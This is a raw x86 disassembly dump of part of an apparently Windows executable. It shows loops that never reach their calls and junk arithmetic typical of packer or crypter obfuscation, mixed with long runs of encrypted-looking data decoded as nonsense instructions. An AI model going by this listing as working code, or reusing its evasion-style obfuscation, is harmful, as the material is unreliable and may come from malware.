  409fb6:	mov    ds,esp
  409fb8:	jo     0x409f86
  409fba:	adc    esi,DWORD PTR ds:0x16a8162f
  409fc0:	ins    BYTE PTR es:[edi],dx
  409fc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fc2:	jae    0x409fb5
  409fc4:	cli    
  409fc5:	pushf  
  409fc6:	outs   dx,BYTE PTR ds:[esi]
  409fc7:	and    esp,DWORD PTR [edx]
  409fc9:	vmptrld QWORD PTR [ebx+0x5f13a56e]
  409fd0:	sub    al,0xe0
  409fd2:	mov    bl,bh
  409fd4:	pop    esp
  409fd5:	test   DWORD PTR [ecx+0x17],0x9e2fde25
  409fdc:	jecxz  0x409f85
  409fde:	outs   dx,DWORD PTR ds:[esi]
  409fdf:	push   0x77af5ad2
  409fe4:	js     0x409f99
  409fe6:	add    DWORD PTR [edi],0x6ceffdce
  409fec:	aaa    
  409fed:	ret    
  409fee:	sbb    ecx,DWORD PTR [edi-0x18]
  409ff1:	add    esi,DWORD PTR [ebp-0x72]
  409ff4:	popa   
  409ff5:	cld    
  409ff6:	les    esi,FWORD PTR [ebx+0x4d]
  409ff9:	mov    ds:0x29c47201,al
  409ffe:	push   edx
  409fff:	mov    al,ds:0x2c828274
  40a004:	icebp  
  40a005:	mov    edx,0x75768a23
  40a00a:	aaa    
  40a00b:	push   cs
  40a00c:	mov    BYTE PTR [ebp-0x5b325088],0x65
  40a013:	lds    esi,FWORD PTR [eax-0x33]
  40a016:	cld    
  40a017:	dec    esp
  40a018:	mov    ss,ebx
  40a01a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a01b:	push   ebp
  40a01c:	in     eax,0x24
  40a01e:	ret    
  40a01f:	pop    si
  40a021:	(bad)  
  40a022:	ja     0x409ff6
  40a024:	test   dl,ah
  40a026:	retf   0x44a6
  40a029:	cs jmp 0xf2a4b2d9
  40a02f:	test   DWORD PTR [eax],edx
  40a031:	jns    0x40a006
  40a033:	xor    DWORD PTR [eax-0x1713fa2b],0x6c
  40a03a:	xor    DWORD PTR [ebx+0x189084d],ecx
  40a040:	jmp    0x40a04c
  40a045:	xor    DWORD PTR [ebp-0x4],0xe149ebf
  40a04c:	mov    ax,WORD PTR [ebp-0x8]
  40a050:	push   DWORD PTR [ebp+0x8]
  40a053:	call   0x40a064
  40a058:	test   eax,eax
  40a05a:	je     0x40a045
  40a060:	leave  
  40a061:	ret    0x4
  40a064:	push   ebp
  40a065:	mov    ebp,esp
  40a067:	sub    esp,0x2c
  40a06a:	and    DWORD PTR ds:0x42a765,0x0
  40a074:	jmp    0x40a084
  40a079:	mov    eax,ds:0x42a765
  40a07e:	inc    eax
  40a07f:	mov    ds:0x42a765,eax
  40a084:	cmp    DWORD PTR ds:0x42a765,0x12
  40a08b:	jae    0x40a110
  40a091:	cmp    DWORD PTR ds:0x42a765,0x22
  40a098:	jne    0x40a0b2
  40a09e:	push   DWORD PTR [ebp-0x14]
  40a0a1:	push   0x6f60
  40a0a6:	push   DWORD PTR [ebp-0x24]
  40a0a9:	push   DWORD PTR [ebp-0x10]
  40a0ac:	call   DWORD PTR ds:0x41d198
  40a0b2:	jmp    0x40a079
  40a0b7:	and    DWORD PTR ds:0x42a871,0x0
  40a0c1:	jmp    0x40a0d1
  40a0c6:	mov    eax,ds:0x42a871
  40a0cb:	inc    eax
  40a0cc:	mov    ds:0x42a871,eax
  40a0d1:	cmp    DWORD PTR ds:0x42a871,0x11
  40a0d8:	jae    0x40a110
  40a0de:	cmp    DWORD PTR ds:0x42a871,0x1e
  40a0e5:	jne    0x40a0fb
  40a0eb:	push   0x89ca
  40a0f0:	push   0x6edd
  40a0f5:	call   DWORD PTR ds:0x41d244
  40a0fb:	jmp    0x40a0c6
  40a100:	mov    ecx,DWORD PTR ds:0x42a78d
  40a106:	mov    eax,ds:0x42a869
  40a10b:	sub    eax,ecx
  40a10d:	xor    ecx,DWORD PTR [ecx+eax*1]
  40a110:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  40a117:	mov    ecx,DWORD PTR ds:0x42a855
  40a11d:	xor    eax,eax
  40a11f:	or     eax,DWORD PTR ds:0x42a891
  40a125:	sub    ecx,eax
  40a127:	imul   ecx,DWORD PTR [ecx+eax*1]
  40a12b:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40a132:	and    DWORD PTR ds:0x42a761,0x0
  40a13c:	jmp    0x40a14e
  40a141:	mov    ecx,DWORD PTR ds:0x42a761
  40a147:	inc    ecx
  40a148:	mov    DWORD PTR ds:0x42a761,ecx
  40a14e:	cmp    DWORD PTR ds:0x42a761,0x1d
  40a155:	jae    0x40a192
  40a15b:	cmp    DWORD PTR ds:0x42a761,0xb
  40a162:	jne    0x40a173
  40a168:	push   0x3d1a
  40a16d:	call   DWORD PTR ds:0x41d19c
  40a173:	cmp    DWORD PTR ds:0x42a761,0xa
  40a17a:	jne    0x40a18d
  40a180:	mov    ecx,DWORD PTR ds:0x42a761
  40a186:	inc    ecx
  40a187:	mov    DWORD PTR ds:0x42a761,ecx
  40a18d:	jmp    0x40a141
  40a192:	mov    eax,0x9567
  40a197:	mov    WORD PTR [ebp-0x4],ax
  40a19b:	add    DWORD PTR ds:0x42a7bd,ecx
  40a1a1:	jmp    0x40a4ba
  40a1a6:	cmp    al,0xc8
  40a1a8:	ret    0xd2d2
  40a1ab:	ror    ah,cl
  40a1ad:	into   
  40a1ae:	jge    0x40a22b
  40a1b0:	enter  0xe560,0x9a
  40a1b4:	call   0x7478:0x78f9e2a7
  40a1bb:	jle    0x40a235
  40a1bd:	js     0x40a16b
  40a1bf:	dec    ebp
  40a1c0:	sub    DWORD PTR [esi+eiz*2-0x6cd57aeb],edi
  40a1c7:	pop    edx
  40a1c8:	and    eax,0x2ae3d95f
  40a1cd:	mov    ch,0x3a
  40a1cf:	ins    DWORD PTR es:[edi],dx
  40a1d0:	push   ss
  40a1d1:	inc    ecx
  40a1d2:	clc    
  40a1d3:	and    eax,0xc8c2f35a
  40a1d8:	retf   
  40a1d9:	(bad)  
  40a1da:	lahf   
  40a1db:	fisttp WORD PTR ds:0x9e66becc
  40a1e1:	push   0x227fac96
  40a1e6:	push   ds
  40a1e7:	or     eax,0x13196729
  40a1ec:	ins    BYTE PTR es:[edi],dx
  40a1ed:	mov    dl,0x56
  40a1ef:	or     eax,0x3e2fbcb3
  40a1f4:	loopne 0x40a1a1
  40a1f6:	loope  0x40a183
  40a1f8:	fisttp DWORD PTR [esp+eiz*2-0xf]
  40a1fc:	fwait
  40a1fd:	and    DWORD PTR [ebx],ebp
  40a1ff:	inc    ecx
  40a200:	mov    eax,ds:0xc57f5f51
  40a205:	xor    eax,0xc7ec78d1
  40a20a:	int    0xf5
  40a20c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a20d:	jns    0x40a1dd
  40a20f:	fistp  WORD PTR [edx-0x31f23cf0]
  40a215:	test   BYTE PTR [edi+0x77],bh
  40a218:	inc    edi
  40a219:	retf   0xbeb1
  40a21c:	les    ebp,FWORD PTR [edx-0x6f]
  40a21f:	call   0xd7e6e407
  40a224:	fisttp WORD PTR [edx]
  40a226:	sahf   
  40a227:	neg    BYTE PTR [ebx]
  40a229:	sbb    al,BYTE PTR [eax+edx*8]
  40a22c:	add    cl,dh
  40a22e:	imul   ebp,DWORD PTR [esi],0x11
  40a231:	add    al,0x24
  40a233:	aaa    
  40a234:	and    eax,0x71d5dd4
  40a239:	xchg   edx,eax
  40a23a:	aam    0x60
  40a23c:	mov    edi,0x77e74a11
  40a241:	stc    
  40a242:	push   ebp
  40a243:	bnd jbe 0x40a23c
  40a246:	dec    ecx
  40a247:	imul   eax,DWORD PTR [ebp+0x29],0x498846d1
  40a24e:	pop    ebp
  40a24f:	out    dx,al
  40a250:	jmp    0x3c7f:0xdabcd177
  40a257:	shl    esp,cl
  40a259:	in     eax,0x7e
  40a25b:	mov    ds:0xb06490ab,al
  40a260:	imul   BYTE PTR [eax+0x35]
  40a263:	inc    esp
  40a264:	xlat   BYTE PTR ds:[ebx]
  40a265:	shl    BYTE PTR [ebx-0x4b],0xe3
  40a269:	sbb    dl,ah
  40a26b:	inc    esp
  40a26c:	into   
  40a26d:	adc    eax,0xc13c09f
  40a272:	push   edi
  40a273:	imul   esi,edi,0x4ba3329b
  40a279:	icebp  
  40a27a:	cli    
  40a27b:	push   ebp
  40a27c:	sbb    al,0xb8
  40a27e:	or     dh,BYTE PTR [eax+0xe]
  40a281:	and    al,0x2d
  40a283:	jb     0x40a2a2
  40a285:	jne    0x40a280
  40a287:	jle    0x40a280
  40a289:	outs   dx,DWORD PTR ds:[esi]
  40a28a:	std    
  40a28b:	(bad)  
  40a28c:	retf   
  40a28d:	push   ds
  40a28e:	push   es
  40a28f:	and    edx,esi
  40a291:	dec    ebx
  40a292:	dec    ebp
  40a293:	aaa    
  40a294:	push   edi
  40a295:	dec    esp
  40a296:	cld    
  40a297:	mov    al,0x8e
  40a299:	mov    ebx,DWORD PTR [edx-0x69063bb2]
  40a29f:	mov    ah,0x5
  40a2a1:	pop    edx
  40a2a2:	test   eax,0xab33e0d0
  40a2a7:	push   edi
  40a2a8:	mov    DWORD PTR ss:[edi],0x6062f6ab
  40a2af:	retf   
  40a2b0:	add    DWORD PTR [ebp-0x5],0x68
  40a2b4:	hlt    
  40a2b5:	test   BYTE PTR [ecx-0x6d8f6be0],bl
  40a2bb:	xchg   ch,dh
  40a2bd:	out    dx,eax
  40a2be:	cmovle ebx,DWORD PTR [edi]
  40a2c1:	dec    esi
  40a2c2:	adc    DWORD PTR [ebx-0x25],0xffffffc8
  40a2c6:	hlt    
  40a2c7:	xor    DWORD PTR [ebx-0x6e48d4da],ebp
  40a2cd:	cmp    BYTE PTR cs:[eax],0xfb
  40a2d1:	pop    ecx
  40a2d2:	mov    ecx,0x33aaaf90
  40a2d7:	push   ebx
  40a2d8:	ja     0x40a288
  40a2da:	pop    eax
  40a2db:	push   ecx
  40a2dc:	retf   0x7b2
  40a2df:	xchg   ecx,edi
  40a2e1:	and    al,0x90
  40a2e3:	gs int3 
  40a2e5:	cmp    cl,BYTE PTR [esi]
  40a2e7:	je     0x40a2ec
  40a2e9:	push   edi
  40a2ea:	icebp  
  40a2eb:	dec    ecx
  40a2ec:	ficom  DWORD PTR [edx+0x70]
  40a2ef:	jmp    0xef143cca
  40a2f4:	inc    edi
  40a2f5:	sub    ebp,DWORD PTR [ebx]
  40a2f7:	ss cwde 
  40a2f9:	mov    bl,0xce
  40a2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2fc:	pop    ebp
  40a2fd:	fsub   QWORD PTR ds:0x2fe2f9e6
  40a303:	xchg   edx,eax
  40a304:	rcl    BYTE PTR [ebx],cl
  40a306:	push   edi
  40a307:	adc    al,0xe3
  40a309:	gs push esp
  40a30b:	inc    esi
  40a30c:	enter  0xbf50,0x3f
  40a310:	(bad)  
  40a311:	mov    ah,0x9d
  40a313:	std    
  40a314:	(bad)  [edi+0x3014e89a]
  40a31a:	lds    edi,FWORD PTR [ebp-0x69f2e41e]
  40a320:	mov    ch,0xc2
  40a322:	loop   0x40a2db
  40a324:	ins    DWORD PTR es:[edi],dx
  40a325:	xchg   ebx,eax
  40a326:	xlat   BYTE PTR ss:[ebx]
  40a328:	out    dx,eax
  40a329:	or     ch,ch
  40a32b:	outs   dx,DWORD PTR ds:[esi]
  40a32c:	mov    bh,ah
  40a32e:	stos   DWORD PTR es:[edi],eax
  40a32f:	cld    
  40a330:	cmp    DWORD PTR [ecx],edx
  40a332:	cdq    
  40a333:	ror    BYTE PTR [ebx],cl
  40a335:	lea    ebp,[esi+0x6b]
  40a338:	or     edi,DWORD PTR [eax-0x13070390]
  40a33e:	fwait
  40a33f:	pop    es
  40a340:	aad    0x6a
  40a342:	lods   al,BYTE PTR fs:[esi]
  40a344:	add    DWORD PTR [ebx],ecx
  40a346:	dec    edi
  40a347:	pop    ds
  40a348:	inc    ebp
  40a349:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a34a:	(bad)
  40a34e:	imul   esi,DWORD PTR [ecx+0x462841d],0x86b3832d
  40a358:	pop    esp
  40a359:	sbb    esp,DWORD PTR [ebp-0x7eb85ff8]
  40a35f:	pop    es
  40a360:	stc    
  40a361:	and    BYTE PTR [ebp-0x78],bh
  40a364:	jmp    0x40a32b
  40a366:	cmp    DWORD PTR [ebx+ebx*4-0x3683e21d],esi
  40a36d:	xor    al,0x68
  40a36f:	mov    eax,0xc143e95c
  40a374:	inc    esp
  40a375:	cdq    
  40a376:	iret   
  40a377:	int3   
  40a378:	gs fwait
  40a37a:	jmp    0xf4bb:0xca82561a
  40a381:	scas   ax,WORD PTR es:[edi]
  40a383:	data16 mov ds:0xdb57283,al
  40a389:	call   0x5c83:0x3782c2d4
  40a390:	sub    edx,DWORD PTR [ecx+esi*1]
  40a393:	fdivr  st(7),st
  40a395:	adc    eax,0xa0f34ca8
  40a39a:	test   eax,0x36bcaf0c
  40a39f:	cmc    
  40a3a0:	cmp    esi,ebp
  40a3a2:	fs ins BYTE PTR es:[edi],dx
  40a3a4:	in     al,0x20
  40a3a6:	push   esi
  40a3a7:	add    al,0xb8
  40a3a9:	popf   
  40a3aa:	js     0x40a3b1
  40a3ac:	pushf  
  40a3ad:	in     al,0x6c
  40a3af:	xor    eax,0xaaf21085
  40a3b4:	js     0x40a348
  40a3b6:	sbb    esi,edi
  40a3b8:	lods   al,BYTE PTR ds:[esi]
  40a3b9:	mov    ebx,0x362c3b81
  40a3be:	outs   dx,BYTE PTR ds:[esi]
  40a3bf:	xchg   edi,eax
  40a3c0:	scas   al,BYTE PTR es:[edi]
  40a3c1:	inc    edx
  40a3c2:	out    dx,al
  40a3c3:	popa   
  40a3c4:	test   al,0x10
  40a3c6:	aas    
  40a3c7:	fidivr WORD PTR [ebx-0x3f528893]
  40a3cd:	xchg   BYTE PTR [eax],dl
  40a3cf:	call   0x773f638f
  40a3d4:	iret   
  40a3d5:	xchg   BYTE PTR [ecx+eiz*2+0x14],al
  40a3d9:	xor    cl,BYTE PTR [edx+0x5af03cbf]
  40a3df:	adc    al,0x6
  40a3e1:	shl    BYTE PTR [edx+0x5ef39bc8],1
  40a3e7:	adc    DWORD PTR [ebx-0x35a1284b],eax
  40a3ed:	mov    gs,WORD PTR [edi]
  40a3ef:	adc    eax,0x5c93540a
  40a3f4:	or     eax,0x6f26a45a
  40a3f9:	loopne 0x40a39e
  40a3fb:	iret   
  40a3fc:	jnp    0x40a45f
  40a3fe:	pop    edi
  40a3ff:	adc    eax,0x66e0baf5
  40a404:	xchg   edx,eax
  40a405:	aaa    
  40a406:	iret   
  40a407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a408:	xchg   edi,eax
  40a409:	lods   eax,DWORD PTR ds:[esi]
  40a40a:	push   ebp
  40a40b:	xchg   ebp,eax
  40a40c:	add    al,0xdb
  40a40e:	in     eax,0xc3
  40a410:	add    al,0x44
  40a412:	add    DWORD PTR [edi+eiz*4+0x5c],esi
  40a416:	cmc    
  40a417:	push   esp
  40a418:	test   eax,0x91fa3370
  40a41d:	and    BYTE PTR [eax-0x3a988b1a],ah
  40a423:	or     bl,cl
  40a425:	push   es
  40a426:	imul   edi,DWORD PTR [ebp-0x52befe22],0x21
  40a42d:	js     0x40a3e8
  40a42f:	std    
  40a430:	cmp    edi,edx
  40a432:	adc    BYTE PTR [eax],bl
  40a434:	(bad)  
  40a435:	adc    eax,0xd2e39612
  40a43a:	or     edi,ebp
  40a43c:	ret    0x1d01
  40a43f:	or     eax,0xb155a932
  40a444:	mov    DWORD PTR [ecx+0x6a80420a],edx
  40a44a:	push   cs
  40a44b:	jle    0x40a3eb
  40a44d:	jge    0x40a40c
  40a44f:	out    dx,al
  40a450:	loope  0x40a491
  40a452:	xor    ebx,ebp
  40a454:	dec    ecx
  40a455:	inc    eax
  40a456:	loope  0x40a475
  40a458:	or     DWORD PTR [edi+esi*1-0x4],ebp
  40a45c:	mov    al,0x42
  40a45e:	aad    0x5c
  40a460:	mov    BYTE PTR [esi+ebp*2],0xb
  40a464:	js     0x40a49c
  40a466:	add    BYTE PTR [edx-0x5d34dc11],0xc1
  40a46d:	xchg   esp,eax
  40a46e:	sbb    DWORD PTR [edi],edi
  40a470:	popaw  
  40a472:	stos   BYTE PTR es:[edi],al
  40a473:	pop    ecx
  40a474:	dec    ebp
  40a475:	sub    ecx,ecx
  40a477:	out    0xd5,al
  40a479:	ret    
  40a47a:	ffreep st(4)
  40a47c:	jg     0x40a4ac
  40a47e:	in     al,dx
  40a47f:	dec    esp
  40a480:	fwait
  40a481:	call   0xc2fc:0xdb367ea9
  40a488:	add    edx,0x6e884441
  40a48e:	cmp    dl,bh
  40a490:	loop   0x40a458
  40a492:	mov    WORD PTR [ebx],fs
  40a494:	repnz push 0x52c950fc
  40a49a:	div    BYTE PTR [edi]
  40a49c:	jnp    0x40a47b
  40a49e:	adc    eax,0x41407ed2
  40a4a3:	jno    0x40a4d6
  40a4a5:	(bad)
  40a4a9:	mov    ds:0xa0f821f1,al
  40a4ae:	gs dec ebp
  40a4b0:	jl     0x40a4b1
  40a4b2:	xor    BYTE PTR [eax],dl
  40a4b4:	lahf   
  40a4b5:	mov    ebx,DWORD PTR [edx]
  40a4b7:	(bad)  
  40a4b8:	loopne 0x40a512
  40a4ba:	lea    eax,[ebp-0x24]
  40a4bd:	and    DWORD PTR ds:0x42a7cd,0x42a7f5
  40a4c7:	mov    DWORD PTR [ebp-0x28],eax
  40a4ca:	sub    DWORD PTR ds:0x42a889,0x30d0
  40a4d4:	mov    eax,DWORD PTR [ebp+0x8]
  40a4d7:	or     ecx,0x3ba0
  40a4dd:	mov    DWORD PTR [ebp-0x20],eax
  40a4e0:	and    DWORD PTR ds:0x42a771,0x0
  40a4ea:	mov    ecx,DWORD PTR ds:0x42a771
  40a4f0:	inc    ecx
  40a4f1:	mov    DWORD PTR ds:0x42a771,ecx
  40a4f7:	cmp    DWORD PTR ds:0x42a771,0xc
  40a4fe:	jne    0x40a50d
  40a504:	push   DWORD PTR [ebp-0x24]
  40a507:	call   DWORD PTR ds:0x41d1a0
  40a50d:	cmp    DWORD PTR ds:0x42a771,0xb
  40a514:	jne    0x40a527
  40a51a:	mov    ecx,DWORD PTR ds:0x42a771
  40a520:	inc    ecx
  40a521:	mov    DWORD PTR ds:0x42a771,ecx
  40a527:	cmp    DWORD PTR ds:0x42a771,0x15
  40a52e:	jb     0x40a4ea
  40a534:	push   ebx
  40a535:	lea    eax,[ebp-0x18]
  40a538:	mov    ebx,DWORD PTR ds:0x42a79d
  40a53e:	mov    ecx,DWORD PTR ds:0x42a851
  40a544:	sub    ecx,ebx
  40a546:	and    ebx,DWORD PTR [ebx+ecx*1]
  40a549:	mov    DWORD PTR [ebp-0x1c],eax
  40a54c:	mov    eax,DWORD PTR [ebp-0x1c]
  40a54f:	and    DWORD PTR ds:0x42a881,0x0
  40a559:	jmp    0x40a56d
  40a55e:	xor    ebx,ebx
  40a560:	add    ebx,DWORD PTR ds:0x42a881
  40a566:	inc    ebx
  40a567:	mov    DWORD PTR ds:0x42a881,ebx
  40a56d:	cmp    DWORD PTR ds:0x42a881,0x15
  40a574:	jae    0x40a597
  40a57a:	cmp    DWORD PTR ds:0x42a881,0x25
  40a581:	jne    0x40a592
  40a587:	push   0x6372
  40a58c:	call   DWORD PTR ds:0x41d0cc
  40a592:	jmp    0x40a55e
  40a597:	push   esi
  40a598:	and    DWORD PTR ds:0x42a849,0x0
  40a5a2:	mov    ebx,DWORD PTR ds:0x42a849
  40a5a8:	inc    ebx
  40a5a9:	mov    DWORD PTR ds:0x42a849,ebx
  40a5af:	cmp    DWORD PTR ds:0x42a849,0x7
  40a5b6:	jne    0x40a5dc
  40a5bc:	push   DWORD PTR [ebp-0x14]
  40a5bf:	push   0x2cb6
  40a5c4:	push   DWORD PTR [ebp-0x1c]
  40a5c7:	push   0x8d7c
  40a5cc:	push   0x42aa62
  40a5d1:	push   0x400000
  40a5d6:	call   DWORD PTR ds:0x41d248
  40a5dc:	cmp    DWORD PTR ds:0x42a849,0x6
  40a5e3:	jne    0x40a5f6
  40a5e9:	mov    ebx,DWORD PTR ds:0x42a849
  40a5ef:	inc    ebx
  40a5f0:	mov    DWORD PTR ds:0x42a849,ebx
  40a5f6:	cmp    DWORD PTR ds:0x42a849,0x1b
  40a5fd:	jb     0x40a5a2
  40a603:	push   edi
  40a604:	mov    edi,0xf89f2e50
  40a609:	jmp    0x40a922
  40a60e:	(bad)  
  40a60f:	ror    bh,0xca
  40a612:	int    0xd9
  40a614:	(bad)  
  40a616:	dec    eax
  40a617:	xor    BYTE PTR [edi+edi*2-0x75],dh
  40a61b:	dec    esi
  40a61c:	pop    ecx
  40a61d:	call   0x7e74:0x7878fede
  40a624:	js     0x40a69e
  40a626:	pop    eax
  40a627:	xchg   ebx,eax
  40a628:	stos   DWORD PTR es:[edi],eax
  40a629:	fcomp  DWORD PTR [edi+0x19]
  40a62c:	and    al,0x7b
  40a62e:	cdq    
  40a62f:	sub    dh,BYTE PTR [ecx+0x57328f6]
  40a635:	test   al,0xc4
  40a637:	sbb    edx,esi
  40a639:	arpl   WORD PTR [ebx-0x74],dx
  40a63c:	sbb    ebx,eax
  40a63e:	lods   eax,DWORD PTR ds:[esi]
  40a63f:	retf   
  40a640:	retf   0xfb17
  40a643:	mov    bh,0x20
  40a645:	scas   al,BYTE PTR es:[edi]
  40a646:	jp     0x40a6b9
  40a648:	inc    edx
  40a649:	cmp    eax,0xded15296
  40a64e:	bound  eax,QWORD PTR [edi+0x717275c0]
  40a654:	jmp    0x14c7:0xa9cc20ff
  40a65b:	shl    DWORD PTR ds:0x77e20b4b,1
  40a661:	dec    edi
  40a662:	xor    al,0x93
  40a664:	mov    eax,0x99c188e9
  40a669:	(bad)  
  40a66b:	sbb    bl,ch
  40a66d:	or     edi,esp
  40a66f:	jne    0x40a64f
  40a671:	mov    esp,0xc18521d4
  40a676:	out    0xa3,eax
  40a678:	(bad)  
  40a679:	push   ebp
  40a67a:	push   ecx
  40a67b:	xlat   BYTE PTR ds:[ebx]
  40a67c:	retf   
  40a67d:	add    edi,eax
  40a67f:	cld    
  40a680:	add    eax,0x17a8c2c6
  40a685:	xor    DWORD PTR [ebx+0x2c],esi
  40a688:	jo     0x40a656
  40a68a:	out    dx,eax
  40a68b:	push   ebp
  40a68c:	and    al,0x95
  40a68e:	dec    eax
  40a68f:	stos   BYTE PTR es:[edi],al
  40a690:	mov    eax,ds:0x87e54c79
  40a695:	inc    esp
  40a696:	out    0x59,al
  40a698:	adc    BYTE PTR [eax],bh
  40a69a:	bound  eax,QWORD PTR [edi+0x72]
  40a69d:	dec    eax
  40a69e:	xchg   DWORD PTR [edi+0x8],edx
  40a6a1:	repnz dec ebx
  40a6a3:	daa    
  40a6a4:	push   ds
  40a6a5:	push   ds
  40a6a6:	adc    edx,edx
  40a6a8:	out    0x90,eax
  40a6aa:	and    bh,BYTE PTR [esi+ebp*1+0x1c]
  40a6ae:	aad    0xab
  40a6b0:	mov    ebx,0x61a38ba1
  40a6b5:	mov    dl,0x33
  40a6b7:	mov    ebp,0xbe60b566
  40a6bc:	ins    BYTE PTR es:[edi],dx
  40a6bd:	push   ebp
  40a6be:	aad    0xef
  40a6c0:	mov    dl,0x28
  40a6c2:	dec    edi
  40a6c3:	rcl    DWORD PTR [esi+0x29],1
  40a6c6:	lock pop ebx
  40a6c8:	mov    ds:0xf839c80e,eax
  40a6cd:	mov    ebp,0xe24008d0
  40a6d2:	adc    al,0x25
  40a6d4:	inc    eax
  40a6d5:	test   BYTE PTR [ebx],0x47
  40a6d8:	add    al,0xbb
  40a6da:	invd   
  40a6dc:	out    0x4d,eax
  40a6de:	sub    ch,al
  40a6e0:	cmp    al,0xb8
  40a6e2:	popf   
  40a6e3:	dec    eax
  40a6e4:	in     eax,dx
  40a6e5:	xchg   esp,eax
  40a6e6:	xlat   BYTE PTR ds:[ebx]
  40a6e7:	ret    0xa908
  40a6ea:	fistp  QWORD PTR [edx]
  40a6ec:	inc    ebp
  40a6ed:	dec    esi
  40a6ee:	sub    BYTE PTR [edi+edx*8-0x432231be],al
  40a6f5:	jecxz  0x40a729
  40a6f7:	inc    DWORD PTR [eax+0x28]
  40a6fa:	lock mov eax,ds:0x7452d071
  40a700:	sar    DWORD PTR [ebp-0x7c],cl
  40a703:	les    edx,FWORD PTR [ecx-0x3]
  40a706:	xchg   esi,eax
  40a707:	test   eax,0xefc725c1
  40a70c:	mov    eax,0xb7808d5e
  40a711:	sbb    eax,0x34ad56c3
  40a716:	ss enter 0x4e3f,0xa2
  40a71b:	mov    eax,0x7f4524e2
  40a720:	loop   0x40a6c6
  40a722:	ret    
  40a723:	add    BYTE PTR [ecx],al
  40a725:	mov    dh,al
  40a727:	mov    BYTE PTR [edx],al
  40a729:	outs   dx,BYTE PTR ds:[esi]
  40a72a:	jge    0x40a74d
  40a72c:	mov    eax,ds:0x6c9281ca
  40a731:	rol    esi,1
  40a733:	push   es
  40a734:	rol    BYTE PTR [eax],1
  40a736:	and    eax,0xc164f20b
  40a73b:	push   esp
  40a73c:	(bad)  
  40a73e:	mov    eax,ds:0x7df87f37
  40a743:	push   ss
  40a744:	inc    edi
  40a745:	mov    ebp,0xfd456671
  40a74a:	push   cs
  40a74b:	aam    0x22
  40a74d:	fsubr  QWORD PTR [esi-0x152c305b]
  40a753:	icebp  
  40a754:	push   ss
  40a755:	jle    0x40a749
  40a757:	mov    al,ds:0x76a2c7d9
  40a75c:	mov    al,0x39
  40a75e:	adc    BYTE PTR [edi],bh
  40a760:	cdq    
  40a761:	test   ah,0xdb
  40a764:	jbe    0x40a6ec
  40a766:	mov    WORD PTR [ebp+eax*1+0x37],cs
  40a76a:	(bad)  
  40a76b:	fdivr  st(7),st
  40a76d:	add    al,0xfc
  40a76f:	mov    ebx,0x937007cd
  40a774:	js     0x40a74b
  40a776:	jns    0x40a7ad
  40a778:	sbb    eax,0x3936f75
  40a77d:	and    DWORD PTR [edi+0x161cb393],0x6a19fd24
  40a787:	ins    BYTE PTR es:[edi],dx
  40a788:	mov    DWORD PTR [edx+eiz*1-0x47],ecx
  40a78c:	jg     0x40a721
  40a78e:	pusha  
  40a78f:	sub    BYTE PTR [edx],cl
  40a791:	pop    edi
  40a792:	mov    bl,0x10
  40a794:	cwde   
  40a795:	fwait
  40a796:	mov    al,0x59
  40a798:	mov    eax,ds:0xfdd545cb
  40a79d:	int3   
  40a79e:	add    DWORD PTR [edx+0x64],0xffffffae
  40a7a2:	mov    ecx,0xed75ecea
  40a7a7:	xchg   esp,eax
  40a7a8:	call   0x16aceabc
  40a7ad:	xchg   esp,eax
  40a7ae:	leave  
  40a7af:	pop    ds
  40a7b0:	mov    eax,0x2ec7088
  40a7b5:	jb     0x40a799
  40a7b7:	mov    ds:0x21d3e4f5,al
  40a7bc:	test   BYTE PTR [ebx+0x5caaa2d2],0x49
  40a7c3:	pusha  
  40a7c4:	and    esi,eax
  40a7c6:	push   edi
  40a7c7:	mov    DWORD PTR [edi+0x7f90fa9d],eax
  40a7cd:	mov    DWORD PTR [ebx+edi*1-0x75],eax
  40a7d1:	add    al,0xf5
  40a7d3:	cdq    
  40a7d4:	jp     0x40a813
  40a7d6:	xor    eax,0x6897c44f
  40a7db:	sub    eax,DWORD PTR [esi]
  40a7dd:	fs jecxz 0x40a786
  40a7e0:	jo     0x40a774
  40a7e2:	inc    ebp
  40a7e3:	ror    DWORD PTR [ebx-0x2c],0x57
  40a7e7:	adc    DWORD PTR [esi-0x7d],esi
  40a7ea:	mov    esi,DWORD PTR [edx]
  40a7ec:	rol    BYTE PTR [ebx-0x2b],1
  40a7ef:	jns    0x40a7fe
  40a7f1:	add    eax,0x7726478d
  40a7f6:	mov    WORD PTR [ecx+0x227a5924],?
  40a7fc:	pop    es
  40a7fd:	adc    ecx,DWORD PTR [edx+0x15]
  40a800:	cmp    dl,0x11
  40a803:	cdq    
  40a804:	add    DWORD PTR [edx],ecx
  40a806:	mov    eax,ds:0xa41fdde3
  40a80b:	xor    edi,DWORD PTR [eax+0x199cc073]
  40a811:	aam    0xb3
  40a813:	mov    dh,0x48
  40a815:	test   BYTE PTR [esi],ch
  40a817:	(bad)  
  40a818:	adc    ah,BYTE PTR [edi]
  40a81a:	jno    0x40a7d1
  40a81c:	dec    BYTE PTR [edi]
  40a81e:	mov    ch,0xb2
  40a820:	sti    
  40a821:	pusha  
  40a822:	pop    edx
  40a823:	or     al,0x7b
  40a825:	sub    ah,BYTE PTR [ecx+0x19]
  40a828:	in     eax,dx
  40a829:	lahf   
  40a82a:	shr    DWORD PTR ds:0x69a02d20,0x29
  40a831:	sbb    cl,BYTE PTR [ebx+eiz*2-0x20d383bf]
  40a838:	xchg   DWORD PTR [esi-0x73a8223c],ebp
  40a83e:	xor    edx,DWORD PTR [esi]
  40a840:	pop    ebx
  40a841:	fucomi st,st(2)
  40a843:	add    eax,0x8161a0e7
  40a848:	into   
  40a849:	push   esp
  40a84a:	aas    
  40a84b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a84c:	jae    0x40a86c
  40a84e:	mov    ch,0x40
  40a850:	fucomi st,st(1)
  40a852:	jg     0x40a85c
  40a854:	ret    0x2a54
  40a857:	dec    esi
  40a858:	fnstcw WORD PTR [edx-0x29]
  40a85b:	(bad)  
  40a85c:	(bad)  
  40a85e:	cs dec eax
  40a860:	push   eax
  40a861:	daa    
  40a862:	jmp    0x2297ee95
  40a867:	std    
  40a868:	pusha  
  40a869:	xor    cl,al
  40a86b:	ss sbb eax,0x4a82540d
